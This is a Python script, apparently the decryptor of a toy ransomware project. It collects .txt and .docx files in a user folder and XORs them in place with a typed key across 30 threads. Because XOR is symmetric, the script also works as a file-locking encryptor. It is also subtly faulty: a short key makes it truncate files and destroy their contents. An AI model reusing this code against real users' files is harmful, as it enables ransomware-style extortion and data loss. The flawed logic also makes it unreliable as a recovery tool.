from threading import Thread
from queue import Queue
import getpass
import os

Extension_to_be_encrypted = ('.txt','.docx' , )
decryption_key = input("Please enter the Decryption key \n")
extend = "\\"
pc_username = getpass.getuser()
desktop_path = "C:\\Users\\"+pc_username+"\\Desktop"
encryption_level = 128 // 8

file_lists_paths = []
for root, dirs, files in os.walk("C:\\Users\\"+pc_username+"\\Music\\Copy") :
    for file in files :
        file_path, file_ext = os.path.splitext(root+extend+file) #separate the name and the extension
        if file_ext in Extension_to_be_encrypted :
            file_lists_paths.append(root+extend+file)

def decrypt(key):
    while q.not_empty :
        file = q.get()
        index = 0
        max_index = encryption_level - 1
        try :
            with open(file,"rb") as f :
                data = f.read()
            with open(file,"wb") as f :
                for byte in data : #rewriting the bytes
                    xor_byte = byte ^ ord(key[index]) #ord grabs the ASCII value of the character
                    f.write(xor_byte.to_bytes(1 ,"little"))
                    if index >= max_index :
                        index = 0
                    else :
                        index += 1
        except:
            print(f'Failed to decrypt the {file}')
        q.task_done()

q = Queue() #special list that can help in multi threading
for file in file_lists_paths:
    q.put(file)
for i in range(30):
    thread = Thread(target=decrypt, args=(decryption_key,), daemon = True)
    thread.start()

q.join()
print("Decryption Successful")